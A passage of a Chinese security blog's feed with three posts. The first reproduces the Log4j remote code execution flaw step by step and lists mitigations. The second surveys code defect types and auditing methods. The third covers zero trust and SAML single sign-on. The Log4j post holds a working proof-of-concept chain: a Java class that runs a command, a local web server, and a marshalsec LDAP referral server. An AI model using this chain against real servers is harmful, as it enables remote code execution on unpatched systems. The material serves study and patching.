    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="Apache-Log4j"><a href="#Apache-Log4j" class="headerlink" title="Apache-Log4j"></a>Apache-Log4j</h1><p><a href="https://github.com/askDing/apache-log4j-poc">Apache Log4j 远程代码执行</a></p><blockquote><p>攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响</p></blockquote><p><img src="https://user-images.githubusercontent.com/45926593/145425339-47c71230-87d2-4519-8919-9c3520850f83.png" alt="image"></p><h2 id="复线步骤"><a href="#复线步骤" class="headerlink" title="复线步骤"></a>复线步骤</h2><h3 id="编译exp-修改Log4jRCE-java"><a href="#编译exp-修改Log4jRCE-java" class="headerlink" title="编译exp-修改Log4jRCE.java"></a>编译exp-修改Log4jRCE.java</h3><pre><code class="java">public class Log4jRCE &#123;    static&#123;        try&#123;            String[] cmd=&#123;&quot;open&quot;,&quot;/System/Applications/Calculator.app&quot;&#125;;            java.lang.Runtime.getRuntime().exec(cmd).waitFor();        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;&#125;</code></pre><h3 id="python起个本地简易web服务"><a href="#python起个本地简易web服务" class="headerlink" title="python起个本地简易web服务"></a>python起个本地简易web服务</h3><p>在target/classes目录下执行 <code>python3 -m http.server 8888</code><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134009.png"></p><h3 id="在本地起一个ldap服务"><a href="#在本地起一个ldap服务" class="headerlink" title="在本地起一个ldap服务"></a>在本地起一个ldap服务</h3><p><code>java  -cp marshalsec-0.0.3-SNAPSHOT-all.jar  marshalsec.jndi.LDAPRefServer &quot;http://127.0.0.1:8888/#Log4jRCE&quot;</code><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210141034.png"></p><h3 id="运行log4j-java程序"><a href="#运行log4j-java程序" class="headerlink" title="运行log4j.java程序"></a>运行log4j.java程序</h3><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210134659.png"></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/log4j-payload.png"></p><h2 id="临时修复方案："><a href="#临时修复方案：" class="headerlink" title="临时修复方案："></a>临时修复方案：</h2><p>（1）修改jvm参数<br>-Dlog4j2.formatMsgNoLookups=true</p><p>（2）修改配置<br>在应用classpath下添加log4j2.component.properties配置文件，log4j2.formatMsgNoLookups=true</p><p>①在jvm启动参数中添加</p><p><code>-Dlog4j2.formatMsgNoLookups=true</code></p><p><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210151940.png"></p><p>③项⽬中创建log4j2.component.properties⽂件，⽂件中增加配置<code>log4j2.formatMsgNoLookups=true</code><br><img src="https://raw.githubusercontent.com/crkmythical/PicGo/main/images/20211210152139.png"></p><p>Log4j2 漏洞修复建议<br>临时性缓解措施（任选一种，但是注意，只有 &gt;=2.1.0 版本才可以用，老版本不支持这个选项）<br>在 jvm 参数中添加 -Dlog4j2.formatMsgNoLookups=true<br>系统环境变量中将LOG4J_FORMAT_MSG_NO_LOOKUPS 设置为 true<br>创建 log4j2.component.properties 文件，文件中增加配置 log4j2.formatMsgNoLookups=true<br>彻底修复漏洞:<br>方案一、研发代码修复：升级到官方提供的 log4j-2.15.0-rc2 版本<br>方案二、生产环境修复：<a href="https://github.com/zhangyoufu/log4j2-without-jndi%E3%80%82%EF%BC%88%E5%A6%82%E6%9E%9C%E4%B8%8D%E6%94%BE%E5%BF%83%E7%BD%91%E4%B8%8A%E4%B8%8B%E8%BD%BD%E7%9A%84%E7%89%88%E6%9C%AC%EF%BC%8C%E4%B9%9F%E5%8F%AF%E4%BB%A5%E8%87%AA%E5%B7%B1%E6%89%8B%E5%8A%A8%E8%A7%A3%E5%8E%8B%E5%88%A0%E9%99%A4%EF%BC%9Azip">https://github.com/zhangyoufu/log4j2-without-jndi。（如果不放心网上下载的版本，也可以自己手动解压删除：zip</a> -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class 删除jar包里的这个漏洞相关的class，然后重启服务即可）</p><p><a href="https://log4j2-detector.chaitin.cn/">长亭检测工具</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;Apache-Log4j&quot;&gt;&lt;a href=&quot;#Apache-Log4j&quot; class=&quot;headerl</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="Exploit" scheme="https://askding.github.io/categories/Kali/Exploit/"/>
    
    
  </entry>
  
  <entry>
    <title>软件代码缺陷概述</title>
    <link href="https://askding.github.io/Kali/PostExploit/%E8%BD%AF%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A6%82%E8%BF%B0.html"/>
    <id>https://askding.github.io/Kali/PostExploit/%E8%BD%AF%E4%BB%B6%E4%BB%A3%E7%A0%81%E7%BC%BA%E9%99%B7%E6%A6%82%E8%BF%B0.html</id>
    <published>2021-11-29T14:43:11.000Z</published>
    <updated>2021-11-29T14:43:11.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h1 id="软件供应链安全分析"><a href="#软件供应链安全分析" class="headerlink" title="软件供应链安全分析"></a>软件供应链安全分析</h1><h2 id="源代码缺陷"><a href="#源代码缺陷" class="headerlink" title="源代码缺陷"></a>源代码缺陷</h2><pre><code> 在SDL(Security Development Lifecycle)中的编码阶段产生的缺陷。</code></pre><h3 id="产生缺陷的原因"><a href="#产生缺陷的原因" class="headerlink" title="产生缺陷的原因"></a>产生缺陷的原因</h3><ul><li>开发人员的经验和能力限制</li><li>引入某些开源项目</li><li>产品发布前未进行安全测试，仅进行功能测试和性能测试</li></ul><h2 id="缺陷的类型"><a href="#缺陷的类型" class="headerlink" title="缺陷的类型"></a>缺陷的类型</h2><h3 id="输入验证类"><a href="#输入验证类" class="headerlink" title="输入验证类"></a>输入验证类</h3><pre><code>从安全角度来看，一切外部来源的数据均应视为不可信数据任何输入内容均应在经过严格过滤或验证后，再进行相应的逻辑处理或存储</code></pre><p>   常见输入验证类缺陷</p><ul><li>SQL注入</li><li>XSS</li><li>LDAP注入</li><li>XPath注入</li><li>OS命令注入</li><li>XML外部实体注入</li></ul><h4 id="缺陷成因"><a href="#缺陷成因" class="headerlink" title="缺陷成因"></a>缺陷成因</h4><blockquote><p>输入数据=(特殊字符、编码、数字) =&gt; 注入载体(Payload)</p></blockquote><blockquote><p>Payload= (几乎任何)外部数据源&lt;环境变量、所有类型的用户参数、外部Web服务等&gt;</p></blockquote><p>程序未对 <strong>输入数据</strong> 进行有效验证所导致的缺陷</p><h4 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h4><blockquote><p>通用的解决方式 ：对<strong>输入进行验证，对输出进行编码</strong></p></blockquote><ul><li><p>输入验证</p><ol><li>对所有输入明确字符集，如UTF-8</li><li>对Request进行数据验证，如数据是否包含超出预期字符，数据范围，数据长度，数据类型</li></ol></li><li><p>输出编码</p><ol><li>通过语意输出编码方式，对所有返回到客户端的来自应用程序信任边界之外的数据进行编码，净化所有不可信的数据输出</li><li>在基本字符不满足业务规则时，需要对危险字符(&lt;、&gt;、\、、%、\、、)进行输出编码，使用特定的安全API</li></ol></li></ul><h3 id="资源管理类"><a href="#资源管理类" class="headerlink" title="资源管理类"></a>资源管理类</h3><pre><code>   指因程序对内存、文件、流、密码等资源的管理或使用不当而导致的缺陷。</code></pre><p>   常见资管管理类漏洞</p><ul><li>缓冲区上益/下溢</li><li>资源未释放</li><li>内存泄漏</li><li>硬编码密码</li></ul><h4 id="缺陷成因-1"><a href="#缺陷成因-1" class="headerlink" title="缺陷成因"></a>缺陷成因</h4><h5 id="内存资源使用不当"><a href="#内存资源使用不当" class="headerlink" title="内存资源使用不当"></a>内存资源使用不当</h5><pre><code>内存资源的不当使用通常会导致程序运行破坏、提升权限等危害</code></pre><ul><li>缓冲区溢出：<pre><code>  针对程序设计缺陷，向程序源缓冲区写入使之溢出的内容(超过缓冲区能保存的最大数据量的数据)， 从而破坏程序运行或趁着中断之际获取程序乃至系统的控制权，根据溢出边界不同分为缓冲区上溢和下溢。</code></pre></li><li>越界访问<pre><code>  当程序访问一个数组中的元素时，如果索引值超过数组的长度，就会导致访问数组之外的内存，出现越界情况。</code></pre></li></ul><h5 id="内存、文件、流等资源管理不当"><a href="#内存、文件、流等资源管理不当" class="headerlink" title="内存、文件、流等资源管理不当"></a>内存、文件、流等资源管理不当</h5><table><thead><tr><th>缺陷名称</th><th>定义</th></tr></thead><tbody><tr><td>内存泄漏</td><td>动态申请的内存未进行有效的释放</td></tr><tr><td>释放后使用</td><td>申请的内存被释放后继续被使用的情况</td></tr><tr><td>二次释放</td><td>对已经释放后的内存进行重复释放</td></tr><tr><td>错误的内存释放对象</td><td>释放的对象并非动态分配的内存</td></tr></tbody></table><h5 id="密码的管理不当"><a href="#密码的管理不当" class="headerlink" title="密码的管理不当"></a>密码的管理不当</h5><pre><code>程序中硬编码会带来敏感信息泄漏、维护困难等问题，弱加密不能有效保护密码</code></pre><h4 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h4><ol><li>对不可信数据进行输入和输出控制。<br>   在进行内存操作时，检查缓存大小，以确保不会出现超出分配空间大小的风险</li><li>在内存、文件、流等资源使用完毕后应正确释放资源<br>   多次资源分配且未合理释放会耗尽资源，导致拒绝服务攻击</li><li>所有进程和线程都应遵循相同的锁定<a href="%E9%94%81%E5%AE%9A%E6%98%AF%E4%B8%80%E7%A7%8D%E5%90%8C%E6%AD%A5%E8%A1%8C%E4%B8%BA%EF%BC%8C%E5%8F%AF%E7%A1%AE%E4%BF%9D%E8%AE%BF%E9%97%AE%E7%9B%B8%E5%90%8C%E8%B5%84%E6%BA%90%E6%97%B6%E5%A4%9A%E4%B8%AA%E7%8B%AC%E7%AB%8B%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B%E5%92%8C%E7%BA%BF%E7%A8%8B%E4%B8%8D%E4%BC%9A%E4%BA%92%E7%9B%B8%E5%B9%B2%E6%89%B0%E3%80%82">^1</a>步骤<br>  若未严格遵循这些步骤，那么其他进程和线程可以以原始进程不可见或无法预测的方式修改共享资源，导致数据或内存损坏、拒绝服务等</li><li>为防范对随机数据的猜测攻击，应当使用加密模块中已验证的随机数生成器生成所有的随机数、随机GUID和随机字符串。保护主要秘密信息免受未授权的访问并使用相关的政策和流程以实现加、解密的密钥管理，使用AES加密算法更安全。同时避免使用硬编码密码的方式存储密码。</li></ol><h3 id="代码质量类"><a href="#代码质量类" class="headerlink" title="代码质量类"></a>代码质量类</h3><pre><code>指由于代码编写不当所导致的缺陷，低劣的代码质量会导致不可预测行为的发生。</code></pre><h4 id="缺陷成因-2"><a href="#缺陷成因-2" class="headerlink" title="缺陷成因"></a>缺陷成因</h4><h5 id="整数问题"><a href="#整数问题" class="headerlink" title="整数问题"></a>整数问题</h5><pre><code>整数分为有符号整数和无符号整数，且有各自的取值范围。当值超出各自的取值范围时会发生回绕</code></pre><h5 id="空指针解引用"><a href="#空指针解引用" class="headerlink" title="空指针解引用"></a>空指针解引用</h5><pre><code>指针存储的是它指向的变量的地址解引用就是引用它指向的变量的值</code></pre><p>当指针的值为NULL或未初始化时，对其进行解引用，会导致程序异常崩溃或者出现其他未定义的行为。</p><h5 id="初始化问题"><a href="#初始化问题" class="headerlink" title="初始化问题"></a>初始化问题</h5><pre><code>根据未初始化变量的位置的不同可分为- 返回值未初始化- 参数未初始化- 赋值未初始化等</code></pre><p>变量在使用前应该被初始化，如果没有进行初始化，那该变量默认值时不确定的，使用此默认值可能导致出现未定义的行为<br>若此变量时指针类型且没有初始化的情况下进行了解引用，那么会导致空指针解引用</p><h5 id="不当的循环终止"><a href="#不当的循环终止" class="headerlink" title="不当的循环终止"></a>不当的循环终止</h5><pre><code>在循环语句中，循环体被重复执行的次数由循环条件所控制。它是一个标量表达式若控制表达式的值不等于0，循环条件为true；反之循环条件为false。当循环条件设置不当时，会导致死循环的产生。</code></pre><h4 id="防范方法"><a href="#防范方法" class="headerlink" title="防范方法"></a>防范方法</h4><ul><li>在使用整数时，要避免操作结果超出整数的取值范围</li><li>在使用指针时，要判断其是否为空</li><li>变量在定义或声明时进行初始化，养成良好的编码习惯</li><li>描述循环问题时，要注意设置恰当的循环条件</li></ul><h2 id="发现缺陷的方法"><a href="#发现缺陷的方法" class="headerlink" title="发现缺陷的方法"></a>发现缺陷的方法</h2><h3 id="人工审计"><a href="#人工审计" class="headerlink" title="人工审计"></a>人工审计</h3><pre><code>人工对源代码进行走查，依据缺陷的特征进行查找和分析，从而确定是否存在缺陷。优点：    人工审计优势体现在可以发现与业务逻辑等相关的缺陷 缺点：     对审计人员能力要求高，需具备熟悉软件业务，读懂源码，且具有丰富安全知识</code></pre><h3 id="工具审计"><a href="#工具审计" class="headerlink" title="工具审计"></a>工具审计</h3><pre><code>运行源码缺陷检测工具，自动发现源码中存在的缺陷</code></pre><p>  自动化检测工具通常内置多种检测规则，在接收到输入内容后，将输入内容转变为易于扫描分析的数据结构，然后使用静态分析技术对其进行分析，从而发现源码中存在符合一定模式的缺陷。<br>      优缺点：<br>          效率高，存在误报漏报问题</p><ul><li>奇安信代码卫士</li><li>360代码卫士</li><li>端玛DMSCA</li><li>VeraCode静态源代码扫描分析服务平台</li><li>Fortify SCA 及 Checkmarx产品扫描服务</li></ul><h3 id="人工审计与工具审计结合"><a href="#人工审计与工具审计结合" class="headerlink" title="人工审计与工具审计结合"></a>人工审计与工具审计结合</h3><pre><code>先通过工具审计的方式获取检测结果，然后再人工对检测结果进行复审，从而发现缺陷。</code></pre><h2 id="缺陷处置流程"><a href="#缺陷处置流程" class="headerlink" title="缺陷处置流程"></a>缺陷处置流程</h2><h3 id="1-发现并确认缺陷"><a href="#1-发现并确认缺陷" class="headerlink" title="1.发现并确认缺陷"></a>1.发现并确认缺陷</h3><ul><li>与开发流程整合<ul><li>开发人员可以在管理平台中配置好任务计划，检测工具根据任务计划的设定，自动从SVN、Git等代码仓库中获取代码进行检测。检测结束后，可以查看检测结果并进行审计。</li></ul></li><li>安全部门实施测试<ul><li>在系统上线前，安全部门要对全部源代码进行一次安全检测和审计，对软件源代码的安全状况进行整体把控，并修复发现的安全缺陷，在代码各项指标达到最初设定的安全目标后方可上线发布。</li></ul></li></ul><h3 id="2-修复缺陷"><a href="#2-修复缺陷" class="headerlink" title="2.修复缺陷"></a>2.修复缺陷</h3><p>缺陷修复通常由开发和运维人员修复。开发人员需要根据缺陷的具体信息，制定修复方案，确认方案无误后可修改源代码，完成缺陷修复</p><h3 id="3-回归测试"><a href="#3-回归测试" class="headerlink" title="3.回归测试"></a>3.回归测试</h3><p>需要对修复后的源代码进行回归测试，用于确认缺陷是否已经被修复且未引入新的缺陷。</p><h2 id="自动化缺陷检测技术"><a href="#自动化缺陷检测技术" class="headerlink" title="自动化缺陷检测技术"></a>自动化缺陷检测技术</h2><h3 id="语法分析技术"><a href="#语法分析技术" class="headerlink" title="语法分析技术"></a>语法分析技术</h3><pre><code>语法分析指按照具体编程语言的语法规则处理词法，分析程序产生的结果并生成语法分析树的过程，是编译过程中的重要步骤，也是其他分析的基础。</code></pre><p>   此过程可以判断程序中是否存在语法错误(是否与BNF范式一致)</p><h3 id="类型分析技术"><a href="#类型分析技术" class="headerlink" title="类型分析技术"></a>类型分析技术</h3><p>类型分析主要指类型检查，分析程序中是否存在类型错误。<br>类型错误通常指违反类型约束的操作，</p><h3 id="控制流分析技术"><a href="#控制流分析技术" class="headerlink" title="控制流分析技术"></a>控制流分析技术</h3><p>控制流分析的输出是控制流图，<br>通过控制流图可以得到关于程序结构的一些描述，包括条件、循环等信息。</p><h3 id="数据流分析技术"><a href="#数据流分析技术" class="headerlink" title="数据流分析技术"></a>数据流分析技术</h3><p>数据流分析用于获取有关数据如何在程序的执行路径上流程的信息。<br>同时污染传播分析也是数据流分析技术的一种应用。</p><h2 id="代码安全保障技术趋势"><a href="#代码安全保障技术趋势" class="headerlink" title="代码安全保障技术趋势"></a>代码安全保障技术趋势</h2><p>随着开发模式的不断演进和信息安全趋势的变化，人们对代码安全保障技术提出了规模化、自动化、智能化的要求，以期实现软件快速、安全、自动的发布。</p><h3 id="基于AI的代码安全分析"><a href="#基于AI的代码安全分析" class="headerlink" title="基于AI的代码安全分析"></a>基于AI的代码安全分析</h3><pre><code>人工智能技术和传统代码安全技术的结合是代码安全领域的重要发展趋势之一。</code></pre><p>引入人工智能后，我们可以将SAST工具的结果作为输入，不断进行缺陷训练，从而发现误报，<br>然后系统会输出某个置信水平内的误报列表(或排除误报的列表)。<br>为了对其进行进一步的改进，可以通过结果的审计，识别出新的误报并反馈到训练集中，计算出新的模型。</p><h3 id="面向安全的软件代码成分分析"><a href="#面向安全的软件代码成分分析" class="headerlink" title="面向安全的软件代码成分分析"></a>面向安全的软件代码成分分析</h3><pre><code>SCA技术和其他AST技术的深入融合也是代码安全技术发展的趋势之一。</code></pre><p>软件代码成分分析(Software Composition Analysis,SCA)技术指通过对软件的组成(如源码、字节码、二进制文件、可执行文件等)进行分析，<br>识别出软件中使用的开源和第三方组件(如 底层库、框架等)，<br>进一步发现开源安全风险和第三方组件的漏洞。</p><h3 id="面向DevSecOps的代码安全测试"><a href="#面向DevSecOps的代码安全测试" class="headerlink" title="面向DevSecOps的代码安全测试"></a>面向DevSecOps的代码安全测试</h3><pre><code>能够在代码编写的同时，发现代码中的安全隐患，从而在第一时间修复，成为DevSecOps的基本需求。因此IDE插件、轻量级的客户端快速检测模式也成为下一代代码安全产品的标配。</code></pre><p>   由于大量应用持续集成，部署在DevOps中，代码安全产品需要与Jenkins、Bamboo等持续集成系统，Bugzilla、Jira等生命周期管理系统进行集成，实现有效的自动化。<br>   同时，提供针对代码安全基线的检测，以及增量分析、审计信息携带等功能，可在少量或没有人工参与的情况下，尽可能快速、有效保证软件的安全性。</p><h3 id="交互式应用安全测试"><a href="#交互式应用安全测试" class="headerlink" title="交互式应用安全测试"></a>交互式应用安全测试</h3><pre><code>IAST技术结合DAST技术和SAST技术，从而提高测试的准确率，同时对代码的测试覆盖率达到了与SAST相似的水平。</code></pre><p>IAST的插桩模式原理：<br>插桩探针想要分析数据流需要做两件事：</p><ol><li>理解代码<pre><code> 根据不同语言来区分需要关注哪些函数，这些函数里哪些是污点输入？哪些是污点传播？哪些是污点清洗？以及又有哪些是污点汇聚？这个我们可以根据不同的漏洞原理来做分析.</code></pre></li><li>捕获关键关键函数的调用情况<pre><code> Java提供了一个instrumentation 接口。通过该接口，可以以一种标准的方式，在启动应用时添加javaagent参数来加载插桩探针，通过Agent获取到JAVA的目标代码（字节码）、并修改字节码的方式在程序目标码确定函数执行点，并追踪函数执行过程，分析数据流。从而实现动态数据流污点追踪。</code></pre></li></ol><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&quot;软件供应链安全分析&quot;&gt;&lt;a href=&quot;#软件供应链安全分析&quot; class=&quot;headerlink&quot; t</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>ZeroTrust</title>
    <link href="https://askding.github.io/Kali/PostExploit/ZeroTrust.html"/>
    <id>https://askding.github.io/Kali/PostExploit/ZeroTrust.html</id>
    <published>2021-11-18T09:05:23.000Z</published>
    <updated>2021-11-18T09:05:23.000Z</updated>
    
    <content type="html"><![CDATA[<p>编写进度</p><ul><li><input checked="" disabled="" type="checkbox"> </li></ul><h2 id="EAA"><a href="#EAA" class="headerlink" title="EAA"></a>EAA</h2><h3 id="现有解决方案及其局限性"><a href="#现有解决方案及其局限性" class="headerlink" title="现有解决方案及其局限性"></a>现有解决方案及其局限性</h3><ul><li>应用直接面对公网威胁</li><li>VPN部署和防火墙规则不灵活，VPN访问慢</li><li>多应用情况下的单点登陆</li><li>对访问终端安全没有控制方式，恶意软件，网络钓鱼和数据泄露</li></ul><p>Akamai方案EAA</p><p>![image-20211113145127816](/Users/crkmythical/Library/Application Support/typora-user-images/image-20211113145127816.png)</p><ul><li>访问的安全性 </li></ul><p>![image-20211113141518108](/Users/crkmythical/Library/Application Support/typora-user-images/image-20211113141518108.png)</p><ul><li>网络的安全性</li></ul><p>![image-20211113140447162](/Users/crkmythical/Library/Application Support/typora-user-images/image-20211113140447162.png)</p><ul><li>访问审计的安全性</li></ul><p>![image-20211113141006070](/Users/crkmythical/Library/Application Support/typora-user-images/image-20211113141006070.png)</p><ul><li>管理的易用性</li></ul><p>![image-20211113141654756](/Users/crkmythical/Library/Application Support/typora-user-images/image-20211113141654756.png)</p><ul><li>运营成本的支出</li></ul><p>![image-20211113141726159](/Users/crkmythical/Library/Application Support/typora-user-images/image-20211113141726159.png)</p><ul><li>Akamai EAA方案优点<ul><li>快速安装部署无需安装客户端</li><li>降低资本支出和运营成本</li><li>简化管理</li><li>确保应用安全</li></ul></li></ul><p><a href="https://docs.authing.cn/v2/guides/connections/">Identity Provider(IdP)</a></p><p>外部身份源（Identity Provider，简称 IdP）指的是一个存储和管理用户信息的外部服务，使用外部身份服务商可以降低用户管理成本以及降低用户使用成本。</p><h2 id="零信任网络安全框架"><a href="#零信任网络安全框架" class="headerlink" title="零信任网络安全框架"></a>零信任网络安全框架</h2><p><a href="https://docs.authing.cn/v2/concepts/zero-trust-network.html">https://docs.authing.cn/v2/concepts/zero-trust-network.html</a></p><p>概念： 零信任是一种安全模型，基于多种信任要素（如访问主体身份、网络环境、终端状态等）对所有用户进行持续验证和动态授权。  （由弗雷斯特研究公司首席分析师JohnKindervag提出）</p><p><a href="https://www.akamai.com/zh/lp/report/forrester-zero-trust-wave-q3-2020-report">Akamai 被评为 Zero Trust 领导者</a></p><ul><li><p>传统的安全模型通过 <strong>一次验证+静态授权</strong>的方式评估实体风险，</p></li><li><p>而零信任基于 <strong>持续验证+动态授权</strong> 的模式构筑企业的安全基石。</p></li></ul><p>零信任核心原则</p><p><img src="https://download.huawei.com/mdl/image/download?uuid=304b36b98b664f858a6d1a0afa51a5bd"></p><ul><li>永不信任，持续验证 构建身份安全基石</li></ul><p>​        零信任对人，终端和应用进行统一身份化管理，建立以身份为中心的访问控制机制。</p><p>​        以动态考量因素(如访问主体身份、网络环境、终端状态等)持续检测访问过重中违规和异常行为，确保接入网络的用户和终端持续可信</p><ul><li>动态授权 ， 精细访问控制，权限随需而动</li></ul><p>​        零信任将访问目标的权限细化到应用级、功能级、数据级，只对访问主体开放所需的应用、功能或数据，满足最小权限原则，收缩潜在攻击面。</p><p>​        同时安全控制策略给予访问主体、目标客体、环境属性(终端状态、网络风险、用户行为等)进行权限动态判定，实现应用功能、数据等维度的精细划分和动态控制。</p><ul><li>全局防御， 协同联动，威胁快速处置</li></ul><p>​        零信任通过对终端风险、用户行为异常、流量威胁、应用鉴权行为进行多方面评估，对信任分低的应用或设备生成相应的处置策略，联动网络或安全设备进行威胁快速处置。</p><p>零信任的技术本质是以身份为基石的动态访问控制，其主要价值为将安全能力内嵌入业务体系，构建自适应的内生安全机制。</p><p>好处：</p><p>场景一：异地协同办公，数据融合管理，业务云化部署</p><p>每个用户及其所使用的访问设备进行身份验证，同时将每个用户的权限降低到处理其业务所需的绝对最小权限。</p><p>企业部署场景</p><ul><li>具有远程分支机构</li><li>多云</li><li>有大量非员工访问需求</li><li>跨企业边界的写作文</li><li>面向公众的服务企业</li></ul><h2 id="零信任架构（ZTA）实施建议"><a href="#零信任架构（ZTA）实施建议" class="headerlink" title="零信任架构（ZTA）实施建议"></a>零信任架构（ZTA）实施建议</h2><ol><li>零信任：同步工作<ul><li>优先考虑实施，关键网络最先实施</li><li>设置零信任管理岗位</li><li>数据通信全程加密</li></ul></li><li>用户认证<ul><li>探索和测试颗粒度更细的用户属性</li><li>身份管理者统一管理</li><li>管理职权依赖任务临时分配</li><li>开发用户许可级别</li><li>各组织之间制定共同战略</li><li>将零信任原则作为用户和设备的基线</li></ul></li><li>设备认证<ul><li>准入前设备检查和定期设备健康检查</li><li>记录设备使用日志</li><li>构建 “以便携为中心” 的设备管理</li></ul></li><li>最小权限访问授权<ul><li>使用单一联合授权源</li><li>精细的级别标记数据和资源</li><li>用户和设备位置与授权解耦</li></ul></li></ol><h2 id="讨论"><a href="#讨论" class="headerlink" title="讨论"></a>讨论</h2><h3 id="EAA与VPN的区别和优势"><a href="#EAA与VPN的区别和优势" class="headerlink" title="EAA与VPN的区别和优势"></a>EAA与VPN的区别和优势</h3><h3 id="SAML身份验证机制"><a href="#SAML身份验证机制" class="headerlink" title="SAML身份验证机制"></a><a href="https://help.aliyun.com/document_detail/174224.html?utm_content=g_1000230851&spm=5176.20966629.toubu.3.f2991ddcpxxvD1#CWelL">SAML身份验证机制</a></h3><p><img src="https://docs.citrix.com/en-us/citrix-adc/media/saml-flow-citrix.png"></p><p>SAML（Security Assertion Markup Language）是一个基于XML的开放标准数据格式，用于在不同的安全域之间交换认证和数据授权。SAML解决的最重要的需求是Web端应用的单点登录（SSO）</p><h3 id="SAML协议工作流程"><a href="#SAML协议工作流程" class="headerlink" title="SAML协议工作流程"></a>SAML协议工作流程</h3><p>SAML角色： </p><ul><li><p>SP(Service Provider) : 向用户提供服务的web 端应用</p></li><li><p>IdP(Identity Provider) : 向SP提供用户身份信息</p></li><li><p>User : 通过登录IDP获取身份断言，并向SP返回身份断言来使用SP提供服务的用户</p></li></ul><p><img src="https://help-static-aliyun-doc.aliyuncs.com/assets/img/zh-CN/4993794951/p132458.png"></p><ol><li>用户请求访问 Web 应用系统。</li><li>Web 应用系统生成一个 SAML 身份验证请求。</li><li>Web 应用系统将重定向网址发送到用户的浏览器。重定向网址包含应向SSO 服务提交的编码 SAML 身份验证请求。</li><li>IDP 对 SAML 请求进行解码。</li><li>IDP对用户进行身份验证。认证成功后，IDP生成一个 SAML 响应，其中包含经过验证的用户的用户名。然后将SAML 响应编码并返回到用户的浏览器。</li><li>浏览器将 SAML 响应转发到 Web 应用系统 ACS URL。</li><li>Web 应用系统使用 IDP 的公钥验证 SAML 响应。如果成功验证该响应，ACS 则会将用户重定向到目标网址。</li><li>用户将重定向到目标网址并登录到 Web 应用系统。</li></ol><p>在 SAML 协议中，IDP 和 SP 不需要直接进行通讯，只要用户浏览器可以访问到 IDP 和 SP 即可。</p><p>也就是说 SAML 协议在混合云环境下也可以正常进行使用，只要用户浏览器可以访问到公有云的 IDP 和内网的应用就可以使用 SAML 协议集成应用的单点登录。</p><p>参考：</p><p><a href="https://info.support.huawei.com/info-finder/encyclopedia/zh/%E9%9B%B6%E4%BF%A1%E4%BB%BB.html">什么是零信任，为什么零信任很重要</a></p><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;编写进度&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input checked=&quot;&quot; disabled=&quot;&quot; type=&quot;checkbox&quot;&gt; &lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;EAA&quot;&gt;&lt;a href=&quot;#EAA&quot; class=&quot;headerlink&quot; title=&quot;EAA&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="Kali" scheme="https://askding.github.io/categories/Kali/"/>
    
    <category term="PostExploit" scheme="https://askding.github.io/categories/Kali/PostExploit/"/>
    
    
  </entry>
  
  <entry>
    <title>如何在mac上抓小程序的流量</title>
